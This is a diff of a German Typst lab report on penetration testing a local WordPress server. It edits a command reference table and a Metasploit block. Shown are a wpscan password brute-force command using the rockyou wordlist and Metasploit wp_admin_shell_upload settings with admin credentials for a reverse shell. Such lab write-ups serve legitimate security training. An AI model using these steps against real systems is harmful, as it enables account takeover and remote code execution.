@@ -36,7 +36,8 @@ Nmap ist ein freier Portscan der verwendet wird um Informationen über das Ziels
 - [ ] Ausführung von Befehlen auf Metasploit
 
 == Befehlsreferenz
-
+#[
+#set par(justify: false);
 #set table(
   stroke: (x, y) => (
     if y == 0 {
@@ -52,7 +53,7 @@ Nmap ist ein freier Portscan der verwendet wird um Informationen über das Ziels
 )
 
 #table(
-  columns: (2fr, 1fr),
+  columns: (3fr, 2fr),
   inset: 10pt,
   align: horizon,
   table.header(
@@ -81,13 +82,14 @@ Nmap ist ein freier Portscan der verwendet wird um Informationen über das Ziels
   [Durchführung von Map Scan],
   [```bash hosts```],
   [Erkannte Hosts anzeigen],
-  [```bash wpscan --url http://192.168.181.167 -U users.txt -P /usr/share/wordlists/rockyou.txt ```],
+  [```bash wpscan --url http://192.168.181.167 -U users.txt -P /usr/share/wordlists/rockyou.txt```],
   [Durchführung von wpscan],
   [ Reversed-Shell Ausführung (Kapitel 5.3.2)],
   [Reversed-Shell Ausführung],
 )
-
+]
 === docker-compose.yml
+In dem nachfolgenden Codeblock steht die Konfiguration der docker-compose.yml Datei. 
 #sourcecode[```yaml
 services:
   db:
@@ -125,11 +127,12 @@ volumes:
 ```] 
 
 === Reversed-Shell
+In dem nachfolgenden Codeblock steht die Konfiguration der Reversed-Shell
 ```bash
 use exploit/unix/webapp/wp_admin_shell_upload
-set RHOSTS 192.168.181.167 # Ziel-IP des WordPress-Servers
-set TARGETURI /           # WordPress läuft direkt im Root-Verzeichnis
-set USERNAME Morris        # Administrator-Benutzername
-set PASSWORD Ganzgeheim123!  # Administrator-Passwort
+set RHOSTS 192.168.181.167  # Ziel-IP des WordPress-Servers
+set TARGETURI /             # WordPress läuft direkt im Root-Verzeichnis
+set USERNAME Morris         # Administrator-Benutzername
+set PASSWORD Ganzgeheim123! # Administrator-Passwort
 exploit
 ```
